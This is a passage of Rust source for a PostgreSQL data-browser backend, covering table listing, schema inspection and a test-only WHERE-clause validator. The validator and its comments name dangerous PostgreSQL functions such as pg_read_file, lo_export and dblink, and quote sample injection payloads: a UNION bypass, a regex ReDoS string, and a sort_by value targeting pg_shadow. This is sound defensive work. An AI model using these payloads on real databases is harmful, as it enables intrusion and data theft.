            warn!(%error, "failed to bound PostgreSQL entity-info statistics query");
            return (None, None);
        }

        let qualified = format!(
            "\"{}\".\"{}\"",
            escape_ident(schema_name),
            escape_ident(entity_name)
        );

        // Bound as a *string* to ::regclass — never interpolated as SQL — so a
        // crafted table name cannot escape into the catalog query.
        let stats = client
            .query_one(
                // `$1::text::regclass`, not `$1::regclass`: the latter makes
                // the extended protocol infer a `regclass` parameter type,
                // which the driver cannot bind a String to — the query then
                // fails silently and every table falls back to the full scan
                // this function exists to avoid.
                "SELECT reltuples, pg_total_relation_size($1::text::regclass) \
                 FROM pg_class WHERE oid = $1::text::regclass",
                &[&qualified],
            )
            .await
            .ok();

        let (reltuples, size_bytes) = match stats {
            Some(row) => (
                row.try_get::<_, f32>(0).ok(),
                row.try_get::<_, i64>(1).ok().map(|s| s.max(0) as u64),
            ),
            None => (None, None),
        };

        // Large and analysed → trust the estimate and skip the scan.
        if let Some(estimate) = reltuples {
            if estimate >= Self::EXACT_COUNT_MAX_ROWS {
                return (Some(estimate as usize), size_bytes);
            }
        }

        // Small, or never analysed → exact count is affordable.
        let count_query = format!("SELECT COUNT(*) FROM {qualified}");
        let row_count = client
            .query_one(&count_query, &[])
            .await
            .ok()
            .and_then(|row| row.try_get::<_, i64>(0).ok())
            .map(|c| c as usize);

        (row_count, size_bytes)
    }
    /// Return the byte length of a PostgreSQL dollar-quote delimiter at the
    /// start of `sql`. Tags follow unquoted identifier rules, except that `$`
    /// is not permitted inside the tag.
    #[cfg(test)]
    fn dollar_quote_delimiter_len(sql: &str) -> Option<usize> {
        let after_dollar = sql.strip_prefix('$')?;
        if after_dollar.starts_with('$') {
            return Some(2);
        }

        let mut chars = after_dollar.char_indices();
        let (_, first) = chars.next()?;
        // PostgreSQL accepts any high-bit character in an unquoted identifier,
        // including characters Rust does not classify as alphabetic.
        if !(first == '_' || first.is_ascii_alphabetic() || !first.is_ascii()) {
            return None;
        }

        for (index, character) in chars {
            if character == '$' {
                return Some(1 + index + character.len_utf8());
            }
            if !(character == '_' || character.is_ascii_alphanumeric() || !character.is_ascii()) {
                return None;
            }
        }

        None
    }

    /// Strip SQL string literals to avoid false positives when scanning for dangerous patterns.
    /// Replaces content inside single-quoted strings with empty strings while
    /// honoring PostgreSQL `E'...'` escapes and dollar-quoted strings.
    /// Ambiguous backslash-escaped quotes in ordinary strings are rejected so
    /// validation is independent of the server's `standard_conforming_strings`
    /// setting.
    #[cfg(test)]
    fn strip_sql_string_literals(sql: &str) -> Result<String> {
        let mut result = String::with_capacity(sql.len());
        let mut position = 0;

        while position < sql.len() {
            let remaining = &sql[position..];

            let at_token_boundary = sql[..position].chars().next_back().is_none_or(|previous| {
                !(previous.is_ascii_alphanumeric()
                    || previous == '_'
                    || previous == '$'
                    || !previous.is_ascii())
            });
            if let Some(delimiter_len) = at_token_boundary
                .then(|| Self::dollar_quote_delimiter_len(remaining))
                .flatten()
            {
                let delimiter = &remaining[..delimiter_len];
                let content = &remaining[delimiter_len..];
                let closing_offset = content.find(delimiter).ok_or_else(|| {
                    DataError::InvalidQuery(
                        "Unterminated dollar-quoted string in WHERE clause".to_string(),
                    )
                })?;
                result.push_str("''");
                position += delimiter_len + closing_offset + delimiter_len;
                continue;
            }

            let Some(character) = remaining.chars().next() else {
                break;
            };
            if character == '"' {
                position += character.len_utf8();
                let mut terminated = false;
                while position < sql.len() {
                    let identifier_remaining = &sql[position..];
                    let Some(identifier_char) = identifier_remaining.chars().next() else {
                        break;
                    };
                    position += identifier_char.len_utf8();
                    if identifier_char == '"' {
                        if sql[position..].starts_with('"') {
                            position += '"'.len_utf8();
                        } else {
                            terminated = true;
                            break;
                        }
                    }
                }

                if !terminated {
                    return Err(DataError::InvalidQuery(
                        "Unterminated quoted identifier in WHERE clause".to_string(),
                    ));
                }
                // Keep a quoted-identifier placeholder so `"function"(...)`
                // is still recognized as a forbidden function call.
                result.push_str("\"\"");
                continue;
            }
            if character != '\'' {
                result.push(character);
                position += character.len_utf8();
                continue;
            }

            let prefix = &sql[..position];
            let escape_string = (prefix.ends_with('e') || prefix.ends_with('E'))
                && prefix[..prefix.len() - 1]
                    .chars()
                    .next_back()
                    .is_none_or(|previous| {
                        !(previous.is_ascii_alphanumeric()
                            || previous == '_'
                            || previous == '$'
                            || !previous.is_ascii())
                    });
            result.push('\'');
            position += character.len_utf8();
            let mut terminated = false;

            while position < sql.len() {
                let string_remaining = &sql[position..];
                let Some(string_char) = string_remaining.chars().next() else {
                    break;
                };
                position += string_char.len_utf8();

                if string_char == '\\' {
                    if escape_string {
                        let Some(escaped) = sql[position..].chars().next() else {
                            return Err(DataError::InvalidQuery(
                                "Unterminated escape sequence in WHERE clause string literal"
                                    .to_string(),
                            ));
                        };
                        position += escaped.len_utf8();
                        continue;
                    }

                    if sql[position..].starts_with('\'') {
                        return Err(DataError::InvalidQuery(
                            "Backslash-escaped quotes require an explicit PostgreSQL E string"
                                .to_string(),
                        ));
                    }
                }

                if string_char == '\'' {
                    if sql[position..].starts_with('\'') {
                        position += '\''.len_utf8();
                    } else {
                        result.push('\'');
                        terminated = true;
                        break;
                    }
                }
            }

            if !terminated {
                return Err(DataError::InvalidQuery(
                    "Unterminated string literal in WHERE clause".to_string(),
                ));
            }
        }

        Ok(result)
    }

    /// Validate that a sort_by field name is a safe SQL identifier.
    /// Only allows alphanumeric characters, underscores, and optionally
    /// double-quoted identifiers.
    fn validate_sort_field(sort_by: &str) -> Result<()> {
        let trimmed = sort_by.trim();
        if trimmed.is_empty() {
            return Err(DataError::InvalidQuery(
                "Sort field cannot be empty".to_string(),
            ));
        }

        // Allow double-quoted identifiers.
        //
        // The length guard is load-bearing: for the single character `"` both
        // `starts_with` and `ends_with` are true, so the slice below became
        // `&s[1..0]` and panicked — a remote panic reachable from
        // `?sort_by=%22` with only ExternalServicesRead, and from the agent's
        // --sort_by flag, making it prompt-injectable.
        if trimmed.len() >= 2 && trimmed.starts_with('"') && trimmed.ends_with('"') {
            let inner = &trimmed[1..trimmed.len() - 1];
            // PostgreSQL has no zero-length delimited identifier, so `""`
            // could only ever reach the server as a syntax error.
            if inner.is_empty() || inner.contains('"') {
                return Err(DataError::InvalidQuery(
                    "Sort field identifier contains invalid characters".to_string(),
                ));
            }
            return Ok(());
        }

        // Allow only valid unquoted SQL identifiers: [a-zA-Z_][a-zA-Z0-9_]*
        // Also allow schema.column format
        for part in trimmed.split('.') {
            if part.is_empty() {
                return Err(DataError::InvalidQuery(
                    "Sort field contains empty path segment".to_string(),
                ));
            }
            if !part.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
                return Err(DataError::InvalidQuery(format!(
                    "Sort field '{}' contains invalid characters. Only alphanumeric characters, underscores, and dots are allowed",
                    sort_by
                )));
            }
        }

        Ok(())
    }

    /// Validate SQL input for dangerous operations.
    /// Used to sanitize user-provided WHERE clauses in the data browser.
    ///
    /// Security: Uses both a denylist of dangerous patterns AND structural
    /// validation to prevent SQL injection. The denylist catches known attack
    /// patterns while structural checks block injection vectors like subqueries,
    /// UNION, and function calls that could bypass simple pattern matching.
    #[cfg(test)]
    fn validate_sql(sql: &str) -> Result<()> {
        let sql_trimmed = sql.trim();

        if sql_trimmed.is_empty() {
            return Err(DataError::InvalidQuery(
                "WHERE clause cannot be empty".to_string(),
            ));
        }

        // Strip string literals to avoid false positives on content inside quotes
        // Lex case-sensitive dollar tags and quoted identifiers before
        // lowercasing the remaining SQL for keyword comparisons.
        //
        // SECURITY: collapse every whitespace run to a single space *before*
        // the keyword checks below. The denylist matches literal prefixes like
        // `"union "` / `"union\t"` / `"union\n"`, which meant any other
        // separator PostgreSQL's lexer accepts slipped straight through —
        // `false UNION\rSELECT …` matched nothing, contained no `;` or `(`,
        // and so passed every structural check too. Normalising here means the
        // list only ever has to know about one separator.
        let without_strings =
            normalize_sql_whitespace(&Self::strip_sql_string_literals(sql_trimmed)?).to_lowercase();

        // STRUCTURAL CHECKS: Block injection vectors that denylist alone cannot catch

        // Prevent multi-statement execution via semicolons
        if without_strings.contains(';') {
            return Err(DataError::InvalidQuery(
                "Multiple SQL statements are not allowed".to_string(),
            ));
        }

        // Prevent subqueries through every parenthesized PostgreSQL query form.
        reject_subqueries_and_function_calls(&without_strings)?;

        // Block SQL comments which can be used to hide attack payloads
        if without_strings.contains("--") || without_strings.contains("/*") {
            return Err(DataError::InvalidQuery(
                "SQL comments are not allowed in the data browser".to_string(),
            ));
        }

        // DENYLIST: Block dangerous SQL keywords and operations
        // These are checked against the string-stripped version to prevent
        // hiding keywords inside string literals
        let dangerous_keywords = [
            // DDL operations
            "drop ",
            "truncate ",
            "alter ",
            "create ",
            "grant ",
            "revoke ",
            // Data manipulation that shouldn't appear in WHERE
            "insert ",
            "update ",
            "delete ",
            "copy ",
            // Set operations that enable data exfiltration. One space suffices
            // now that `normalize_sql_whitespace` runs first — previously this
            // enumerated separators by hand and missed \r, \f and \v.
            "union ",
            "intersect ",
            "except ",
            // Dangerous PostgreSQL functions
            "pg_read_file",
            "pg_write_file",
            "pg_ls_dir",
            "pg_read_binary_file",
            "pg_stat_file",
            "lo_import",
            "lo_export",
            "lo_get",
            "lo_put",
            "pg_sleep",
            "pg_terminate_backend",
            "pg_cancel_backend",
            "pg_reload_conf",
            "pg_rotate_logfile",
            "set_config",
            "current_setting",
            "dblink",
            "dblink_connect",
            "dblink_exec",
            // Information disclosure functions
            "pg_ls_logdir",
            "pg_ls_waldir",
            "pg_ls_tmpdir",
            "pg_ls_archive_statusdir",
            // Execute/prepare
            "execute ",
            "prepare ",
            // Transaction control
            "begin ",
            "commit ",
            "rollback ",
            "savepoint ",
            // INTO clause (write results to table/file)
            " into ",
        ];

        // Match on token boundaries, not raw substrings. The trailing space in
        // each entry was doing the boundary work, badly: it made any column
        // whose name *ends* with a keyword unfilterable (`payload` contains
        // `load `... once the following space is counted) while missing the
        // keyword at end-of-input entirely.
        for keyword in &dangerous_keywords {
            if contains_sql_token(&without_strings, keyword.trim()) {
                return Err(DataError::InvalidQuery(format!(
                    "SQL operation '{}' is not allowed in the data browser",
                    keyword.trim()
                )));
            }
        }

        // SECURITY: no regex operators.
        //
        // The denylist above runs on string-stripped input, so a regex pattern
        // — which lives entirely inside a string literal — is invisible to it.
        // `1=1 AND 'aaaaaaaaaaaaaaaaaaaaaaaa' ~ '^(a+)+$'` strips to
        // `1=1 and '' ~ ''` and passes everything. PostgreSQL's regex engine is
        // a backtracking NFA, so that is catastrophic backtracking: the same
        // CPU-burn primitive on the operator's database that the function-call
        // guard exists to prevent, reached through a door the guard cannot see.
        //
        // Not fixable by pattern-matching the payload, because the payload is
        // opaque to us by construction. Reject the operators instead — LIKE and
        // ILIKE cover what a data browser filter legitimately needs.
        // A bare `~` covers ~, ~*, !~, !~* and ~~ in one test. `SIMILAR TO` is a
        // separate spelling that PostgreSQL translates into the SAME
        // backtracking engine, so rejecting only the operator forms left the
        // ReDoS this check exists to stop wide open under a different name.
        if without_strings.contains('~') || contains_sql_token(&without_strings, "similar") {
            return Err(DataError::InvalidQuery(
                "Regular-expression matching (~, ~*, !~, !~*, SIMILAR TO) is not allowed in the \
                 data browser — use LIKE or ILIKE instead"
                    .to_string(),
            ));
        }

        // SECURITY: no parenless information functions.
        //
        // The function-call guard keys on an identifier immediately before `(`,
        // so PostgreSQL's niladic-callable functions — spelled without parens —
        // walk straight past it, as does a `::regclass` cast. None of these are
        // data theft on their own, but they give blind boolean extraction of
        // the connection user, schema and catalog, plus a relation-existence
        // oracle whose error text this API returns verbatim. A data-browser
        // filter has no legitimate use for any of them.
        const INFORMATION_TOKENS: [&str; 15] = [
            "current_user",
            "session_user",
            "current_role",
            "current_catalog",
            "current_schema",
            "current_database",
            // Bare `USER` is a reserved niladic keyword equivalent to
            // CURRENT_USER, so denying only the `current_` spelling left the
            // same blind-extraction oracle open under a shorter name.
            "user",
            // Every `reg*` cast is a catalog-existence oracle — the cast either
            // resolves or raises an error naming what was missing, and this API
            // returns that error text verbatim. Denying only `regclass` covered
            // one of seven.
            "regclass",
            "regrole",
            "regnamespace",
            "regtype",
            "regproc",
            "regprocedure",
            "regoper",
            "regconfig",
        ];
        for token in INFORMATION_TOKENS {
            if contains_sql_token(&without_strings, token) {
                return Err(DataError::InvalidQuery(format!(
                    "'{token}' is not allowed in the data browser"
                )));
            }
        }

        // Also check for dangerous keywords at the very start of the string
        let dangerous_starts = ["into "];
        for keyword in &dangerous_starts {
            if without_strings.starts_with(keyword) {
                return Err(DataError::InvalidQuery(format!(
                    "SQL operation '{}' is not allowed in the data browser",
                    keyword.trim()
                )));
            }
        }

        Ok(())
    }

    /// Map PostgreSQL type to FieldType
    fn map_pg_type(pg_type: &str) -> FieldType {
        match pg_type {
            "boolean" | "bool" => FieldType::Boolean,
            "smallint" | "int2" => FieldType::Int32,
            "integer" | "int" | "int4" => FieldType::Int32,
            "bigint" | "int8" => FieldType::Int64,
            "real" | "float4" => FieldType::Float32,
            "double precision" | "float8" => FieldType::Float64,
            "numeric" | "decimal" => FieldType::Float64,
            "character varying" | "varchar" | "character" | "char" | "text" => FieldType::String,
            "bytea" => FieldType::Bytes,
            "date" => FieldType::Date,
            "timestamp"
            | "timestamp without time zone"
            | "timestamp with time zone"
            | "timestamptz" => FieldType::Timestamp,
            "json" | "jsonb" => FieldType::Json,
            "uuid" => FieldType::Uuid,
            _ => FieldType::String, // Default fallback
        }
    }

    async fn query_columns(
        &self,
        schema_name: &str,
        entity_name: &str,
    ) -> Result<Vec<PgQueryColumn>> {
        let rows = self
            .client
            .query(
                "SELECT columns.column_name, columns.data_type, types.typtype::text \
                 FROM information_schema.columns AS columns \
                 LEFT JOIN pg_catalog.pg_namespace AS namespaces \
                   ON namespaces.nspname = columns.udt_schema \
                 LEFT JOIN pg_catalog.pg_type AS types \
                   ON types.typnamespace = namespaces.oid AND types.typname = columns.udt_name \
                 WHERE columns.table_schema = $1 AND columns.table_name = $2 \
                 ORDER BY columns.ordinal_position",
                &[&schema_name, &entity_name],
            )
            .await
            .map_err(|_error| {
                DataError::SchemaError(format!(
                    "Failed to inspect PostgreSQL query columns for '{}.{}'",
                    schema_name, entity_name
                ))
            })?;
        Ok(rows
            .into_iter()
            .map(|row| PgQueryColumn {
                name: row.get(0),
                data_type: row.get(1),
                udt_kind: row.get(2),
            })
            .collect())
    }
}

#[async_trait]
impl DataSource for PostgresSource {
    fn source_type(&self) -> &'static str {
        "postgres"
    }

    fn capabilities(&self) -> Vec<Capability> {
        vec![Capability::Sql, Capability::TextSearch]
    }

    async fn list_containers(&self, path: &ContainerPath) -> Result<Vec<ContainerInfo>> {
        let client = &self.client;

        match path.depth() {
            // Depth 0: List databases
            0 => {
                debug!("Listing PostgreSQL databases");

                let query = r#"
                    SELECT
                        datname,
                        pg_database_size(datname) as size_bytes,
                        pg_get_userbyid(datdba) as owner,
                        pg_encoding_to_char(encoding) as encoding
                    FROM pg_database
                    WHERE datistemplate = false
                    ORDER BY datname
                "#;

                let rows = client.query(query, &[]).await.map_err(|e| {
                    DataError::QueryFailed(format!("Failed to list databases: {}", e))
                })?;

                let databases: Vec<ContainerInfo> = rows
                    .iter()
                    .map(|row| {
                        let name: String = row.get(0);
                        let size_bytes: Option<i64> = row.try_get(1).ok();
                        let owner: Option<String> = row.try_get(2).ok();
                        let encoding: Option<String> = row.try_get(3).ok();

                        let mut metadata = HashMap::new();
                        if let Some(size) = size_bytes {
                            metadata.insert("size_bytes".to_string(), serde_json::json!(size));
                        }
                        if let Some(own) = owner {
                            metadata.insert("owner".to_string(), serde_json::json!(own));
                        }
                        if let Some(enc) = encoding {
                            metadata.insert("encoding".to_string(), serde_json::json!(enc));
                        }

                        ContainerInfo {
                            name,
                            container_type: ContainerType::Database,
                            capabilities: ContainerCapabilities {
                                can_contain_containers: true,
                                can_contain_entities: false,
                                child_container_type: Some(ContainerType::Schema),
                                entity_type_label: None,
                                entity_count_hint: None,
                            },
                            metadata,
                        }
                    })
                    .collect();

                debug!("Found {} databases", databases.len());
                Ok(databases)
            }

            // Depth 1: List schemas in a database
            1 => {
                let database_name = &path.segments[0];

                // Check if we're connected to the right database
                if database_name != &self.database_name {
                    return Err(DataError::OperationNotSupported(format!(
                        "Cannot list schemas from database '{}' while connected to '{}'. Create a connection to that database.",
                        database_name, self.database_name
                    )));
                }

                debug!("Listing PostgreSQL schemas in database: {}", database_name);

                let query = r#"
                    SELECT
                        schema_name,
                        COUNT(table_name) as table_count
                    FROM information_schema.schemata
                    LEFT JOIN information_schema.tables
                        ON information_schema.tables.table_schema = information_schema.schemata.schema_name
                        -- Must match `list_entities`' filter exactly. This
                        -- counted BASE TABLE only, so once views became
                        -- browsable a schema advertised "3 tables" in the
                        -- container overview and then listed 4 entities.
                        AND table_type IN ('BASE TABLE', 'VIEW')
                    WHERE schema_name NOT IN ('information_schema')
                    GROUP BY schema_name
                    ORDER BY schema_name
                "#;

                let rows = client.query(query, &[]).await.map_err(|e| {
                    DataError::QueryFailed(format!("Failed to list schemas: {}", e))
                })?;

                let schemas: Vec<ContainerInfo> = rows
                    .iter()
                    .map(|row| {
                        let name: String = row.get(0);
                        let entity_count: i64 = row.try_get(1).unwrap_or(0);

                        let mut metadata = HashMap::new();
                        metadata
                            .insert("entity_count".to_string(), serde_json::json!(entity_count));

                        ContainerInfo {
                            name,
                            container_type: ContainerType::Schema,
                            capabilities: ContainerCapabilities {
                                can_contain_containers: false,
                                can_contain_entities: true,
                                child_container_type: None,
                                entity_type_label: Some("table".to_string()),
                                entity_count_hint: Some(EntityCountHint::Small),
                            },
                            metadata,
                        }
                    })
                    .collect();

                debug!(
                    "Found {} schemas in database '{}'",
                    schemas.len(),
                    database_name
                );
                Ok(schemas)
            }

            // Depth >= 2: Not supported
            _ => Err(DataError::InvalidQuery(format!(
                "PostgreSQL hierarchy only supports 2 levels (database/schema). Path depth: {}",
                path.depth()
            ))),
        }
    }

    async fn get_container_info(&self, path: &ContainerPath) -> Result<ContainerInfo> {
        let client = &self.client;

        match path.depth() {
            // Depth 1: Get database info
            1 => {
                let database_name = &path.segments[0];

                let query = r#"
                    SELECT
                        datname,
                        pg_database_size(datname) as size_bytes,
                        pg_get_userbyid(datdba) as owner,
                        pg_encoding_to_char(encoding) as encoding
                    FROM pg_database
                    WHERE datname = $1
                "#;

                let row = client
                    .query_one(query, &[database_name])
                    .await
                    .map_err(|e| {
                        DataError::NotFound(format!(
                            "Database '{}' not found: {}",
                            database_name, e
                        ))
                    })?;

                let name: String = row.get(0);
                let size_bytes: Option<i64> = row.try_get(1).ok();
                let owner: Option<String> = row.try_get(2).ok();
                let encoding: Option<String> = row.try_get(3).ok();

                let mut metadata = HashMap::new();
                if let Some(size) = size_bytes {
                    metadata.insert("size_bytes".to_string(), serde_json::json!(size));
                }
                if let Some(own) = owner {
                    metadata.insert("owner".to_string(), serde_json::json!(own));
                }
                if let Some(enc) = encoding {
                    metadata.insert("encoding".to_string(), serde_json::json!(enc));
                }

                Ok(ContainerInfo {
                    name,
                    container_type: ContainerType::Database,
                    capabilities: ContainerCapabilities {
                        can_contain_containers: true,
                        can_contain_entities: false,
                        child_container_type: Some(ContainerType::Schema),
                        entity_type_label: None,
                        entity_count_hint: None,
                    },
                    metadata,
                })
            }

            // Depth 2: Get schema info
            2 => {
                let database_name = &path.segments[0];
                let schema_name = &path.segments[1];

                if database_name != &self.database_name {
                    return Err(DataError::OperationNotSupported(format!(
                        "Cannot get schema info from database '{}' while connected to '{}'",
                        database_name, self.database_name
                    )));
                }

                let query = r#"
                    SELECT COUNT(*)
                    FROM information_schema.tables
                    WHERE table_schema = $1 AND table_type = 'BASE TABLE'
                "#;

                let row = client.query_one(query, &[schema_name]).await.map_err(|e| {
                    DataError::NotFound(format!("Schema '{}' not found: {}", schema_name, e))
                })?;

                let entity_count: i64 = row.get(0);

                let mut metadata = HashMap::new();
                metadata.insert("entity_count".to_string(), serde_json::json!(entity_count));

                Ok(ContainerInfo {
                    name: schema_name.clone(),
                    container_type: ContainerType::Schema,
                    capabilities: ContainerCapabilities {
                        can_contain_containers: false,
                        can_contain_entities: true,
                        child_container_type: None,
                        entity_type_label: Some("table".to_string()),
                        entity_count_hint: Some(EntityCountHint::Small),
                    },
                    metadata,
                })
            }

            _ => Err(DataError::InvalidQuery(format!(
                "Invalid path depth for get_container_info: {}",
                path.depth()
            ))),
        }
    }

    async fn list_entities(&self, container_path: &ContainerPath) -> Result<Vec<EntityInfo>> {
        // Must be at depth 2 (database/schema)
        if container_path.depth() != 2 {
            return Err(DataError::InvalidQuery(format!(
                "list_entities requires path depth 2 (database/schema), got {}",
                container_path.depth()
            )));
        }

        let database_name = &container_path.segments[0];
        let schema_name = &container_path.segments[1];

        if database_name != &self.database_name {
            return Err(DataError::OperationNotSupported(format!(
                "Cannot list entities from database '{}' while connected to '{}'",
                database_name, self.database_name
            )));
        }

        let client = &self.client;

        debug!("Listing tables in schema: {}", schema_name);

        // Row counts and sizes come from the catalog in the same pass, so the
        // list can show them without N+1 per-table COUNT(*) queries. The
        // MariaDB backend already did this via information_schema; Postgres
        // returned nulls, so the same UI showed real numbers on one engine and
        // em dashes on the other.
        //
        // Views are included: they are browsable like tables and omitting them
        // made schemas look emptier than they are. reltuples/size are
        // meaningless for a view, so they are nulled out below rather than
        // reported as zero.
        let query = r#"
            SELECT
                t.table_schema,
                t.table_name,
                t.table_type,
                c.reltuples,
                pg_total_relation_size(c.oid) AS total_bytes
            FROM information_schema.tables t
            LEFT JOIN pg_namespace n ON n.nspname = t.table_schema
            LEFT JOIN pg_class c ON c.relname = t.table_name AND c.relnamespace = n.oid
            WHERE t.table_schema = $1
              AND t.table_type IN ('BASE TABLE', 'VIEW')
            ORDER BY t.table_name
        "#;

        let rows = client.query(query, &[schema_name]).await.map_err(|e| {
            DataError::QueryFailed(format!(
                "Failed to list tables in schema '{}': {}",
                schema_name, e
            ))
        })?;

        let entities: Vec<EntityInfo> = rows
            .iter()
            .map(|row| {
                let schema: String = row.get(0);
                let table_name: String = row.get(1);
                let table_type: String = row.get(2);
                let is_view = table_type == "VIEW";

                // A view has no heap of its own: reltuples is 0 and
                // pg_total_relation_size is 0. Reporting those as real figures
                // would claim "0 rows, 0 B" about something that may return
                // millions, so leave them unknown instead.
                let row_count = if is_view {
                    None
                } else {
                    row.try_get::<_, f32>(3)
                        .ok()
                        .filter(|estimate| *estimate >= 0.0)
                        .map(|estimate| estimate as usize)
                };
                let size_bytes = if is_view {
                    None
                } else {
                    row.try_get::<_, i64>(4).ok().map(|s| s.max(0) as u64)
                };

                EntityInfo {
                    namespace: schema,
                    name: table_name,
                    entity_type: table_type,
                    row_count,
                    size_bytes,
                    schema: None,
                    metadata: None,
                }
            })
            .collect();

        debug!(
            "Found {} tables in schema '{}'",
            entities.len(),
            schema_name
        );

        Ok(entities)
    }

    async fn get_entity_info(
        &self,
        container_path: &ContainerPath,
        entity_name: &str,
    ) -> Result<EntityInfo> {
        if container_path.depth() != 2 {
            return Err(DataError::InvalidQuery(format!(
                "get_entity_info requires path depth 2 (database/schema), got {}",
                container_path.depth()
            )));
        }

        let database_name = &container_path.segments[0];
        let schema_name = &container_path.segments[1];

        if database_name != &self.database_name {
            return Err(DataError::OperationNotSupported(format!(
                "Cannot get entity info from database '{}' while connected to '{}'",
                database_name, self.database_name
            )));
        }

        let client = &self.client;

        let query = r#"
            SELECT table_type
            FROM information_schema.tables
            WHERE table_schema = $1 AND table_name = $2
        "#;

        let row = client
            .query_one(query, &[schema_name, &entity_name])
            .await
            .map_err(|e| {
                DataError::NotFound(format!(
                    "Table '{}.{}' not found: {}",
                    schema_name, entity_name, e
                ))
            })?;

        let table_type: String = row.get(0);

        // Row count + on-disk size. Both come from planner statistics for
        // anything large — see `row_count_and_size`.
        let (row_count, size_bytes) = self.row_count_and_size(schema_name, entity_name).await;

        Ok(EntityInfo {
            namespace: schema_name.clone(),
            name: entity_name.to_string(),
            entity_type: table_type,
            row_count,
            size_bytes,
            schema: Some(self.get_schema(container_path, entity_name).await?),
            metadata: None,
        })
    }

    async fn get_schema(
        &self,
        container_path: &ContainerPath,
        entity_name: &str,
    ) -> Result<DatasetSchema> {
        if container_path.depth() != 2 {
            return Err(DataError::InvalidQuery(format!(
                "get_schema requires path depth 2 (database/schema), got {}",
                container_path.depth()
            )));
        }

        let database_name = &container_path.segments[0];
        let schema_name = &container_path.segments[1];

        if database_name != &self.database_name {
            return Err(DataError::OperationNotSupported(format!(
                "Cannot get schema from database '{}' while connected to '{}'",
                database_name, self.database_name
            )));
        }

        let client = &self.client;

        debug!("Getting schema for table: {}.{}", schema_name, entity_name);

        let query = r#"
            SELECT
                column_name,
                data_type,
                is_nullable,
                column_default
            FROM information_schema.columns
            WHERE table_schema = $1 AND table_name = $2
            ORDER BY ordinal_position
        "#;

        let rows = client
            .query(query, &[schema_name, &entity_name])
            .await
            .map_err(|e| {
                DataError::SchemaError(format!(
                    "Failed to get schema for table '{}.{}': {}",
                    schema_name, entity_name, e
                ))
            })?;

        let fields: Vec<FieldDef> = rows
            .iter()
            .map(|row| {
                let name: String = row.get(0);
                let data_type: String = row.get(1);
                let is_nullable: String = row.get(2);
                let _column_default: Option<String> = row.get(3);

                FieldDef {
                    name,
                    field_type: Self::map_pg_type(&data_type),
                    nullable: is_nullable == "YES",
                    description: None,
                }
            })
            .collect();

        debug!(
            "Found {} columns for table '{}.{}'",
            fields.len(),
            schema_name,
            entity_name
        );

        Ok(DatasetSchema {
            fields,
            partitions: None,
            primary_key: None,
        })
    }

    async fn close(&self) -> Result<()> {
        debug!("Closing PostgreSQL connection");
        // Connection cleanup handled by Drop
        Ok(())
    }
}

#[async_trait]
impl Introspect for PostgresSource {
    async fn inspect_fields(
        &self,
        container_path: &ContainerPath,
        entity_name: &str,
    ) -> Result<Vec<FieldDef>> {
        let schema = self.get_schema(container_path, entity_name).await?;
        Ok(schema.fields)
    }

    async fn field_exists(
        &self,
        container_path: &ContainerPath,
        entity_name: &str,
        field: &str,
    ) -> Result<bool> {
        if container_path.depth() != 2 {
            return Err(DataError::InvalidQuery("Invalid path depth".to_string()));
        }

        let schema_name = &container_path.segments[1];
        let client = &self.client;

        let query = r#"
            SELECT COUNT(*)
            FROM information_schema.columns
            WHERE table_schema = $1 AND table_name = $2 AND column_name = $3
        "#;

        let row = client
            .query_one(query, &[schema_name, &entity_name, &field])
            .await
            .map_err(|e| {
                DataError::QueryFailed(format!("Failed to check field existence: {}", e))
            })?;

        let count: i64 = row.get(0);
        Ok(count > 0)
    }

    async fn get_field_type(
        &self,
        container_path: &ContainerPath,
        entity_name: &str,
        field: &str,
    ) -> Result<FieldType> {
        if container_path.depth() != 2 {
            return Err(DataError::InvalidQuery("Invalid path depth".to_string()));
        }

        let schema_name = &container_path.segments[1];
        let client = &self.client;

        let query = r#"
            SELECT data_type
            FROM information_schema.columns
            WHERE table_schema = $1 AND table_name = $2 AND column_name = $3
        "#;

        let row = client
            .query_one(query, &[schema_name, &entity_name, &field])
            .await
            .map_err(|e| {
                DataError::NotFound(format!(
                    "Field '{}' not found in table '{}.{}': {}",
                    field, schema_name, entity_name, e
                ))
            })?;

        let data_type: String = row.get(0);
        Ok(Self::map_pg_type(&data_type))
    }
}

#[async_trait]
impl Queryable for PostgresSource {
    async fn query(
        &self,
        container_path: &ContainerPath,
        entity_name: &str,
        filters: Option<serde_json::Value>,
        options: QueryOptions,
    ) -> Result<QueryResult> {
        if container_path.depth() != 2 {
            return Err(DataError::InvalidQuery(
                "Invalid path depth for query".to_string(),
            ));
        }

        let schema_name = &container_path.segments[1];
        let columns = self.query_columns(schema_name, entity_name).await?;

        let start = std::time::Instant::now();
        Self::validate_filters(filters.as_ref())?;
        let schema = self.get_schema(container_path, entity_name).await?;

        // Build SQL query
        let mut sql = format!(
            "SELECT * FROM \"{}\".\"{}\"",
            escape_ident(schema_name),
            escape_ident(entity_name)
        );

        // Add ORDER BY
        if let Some(sort_by) = &options.sort_by {
            // SECURITY: trim ONCE, then validate and quote the same value.
            //
            // `validate_sort_field` trims internally, but the quoting decision
            // below used the raw string. A leading space therefore split them:
            // ` "a ASC,1 FROM pg_shadow--" ` validated as an already-quoted
            // identifier, but `starts_with('"')` was false on the untrimmed
            // value, so it got wrapped again and the payload landed *outside*
            // any quote pair, lexed as SQL by the server. No working exploit was
            // demonstrated — the double-wrap leaves unresolvable identifiers on
            // either side — but a validator and its emitter disagreeing about
            // the value on a raw-concatenation path is not something to leave
            // resting on that.
            let sort_by = sort_by.trim();
            Self::validate_sort_field(sort_by)?;
            if !schema.fields.iter().any(|field| field.name == sort_by) {
                return Err(DataError::InvalidQuery(format!(
                    "Sort field '{}' is not present in table '{}.{}'",
                    sort_by, schema_name, entity_name
                )));
            }
            let sort_order = match options.sort_order.as_deref() {
                Some("desc") | Some("DESC") => "DESC",
                _ => "ASC",
            };
            // Quote the column name to handle camelCase identifiers correctly
            let quoted_sort = format!("\"{}\"", escape_ident(sort_by));
            sql.push_str(&format!(" ORDER BY {} {}", quoted_sort, sort_order));
        }

        // Add LIMIT and OFFSET
        let limit = Self::clamp_limit(options.limit);
        let offset = options.offset.unwrap_or(0);
        sql.push_str(&format!(" LIMIT {} OFFSET {}", limit, offset));
        let sql = with_wire_row_budget(&sql, &columns, options.budget)?;

        debug!(
            entity = entity_name,
            limit, offset, "executing PostgreSQL data query"
        );

        // Safety: SQL injection is prevented by validate_sql() for WHERE clauses
        // and escape_ident() for identifiers. The database user should be read-only
        // as defense-in-depth.
        let client = &self.client;
        let _timeout_guard = self.query_timeout_lock.lock().await;

        // SECURITY / AVAILABILITY: bound the query server-side before running it.
        //
        // The caller's tokio deadline frees the control-plane task, but dropping
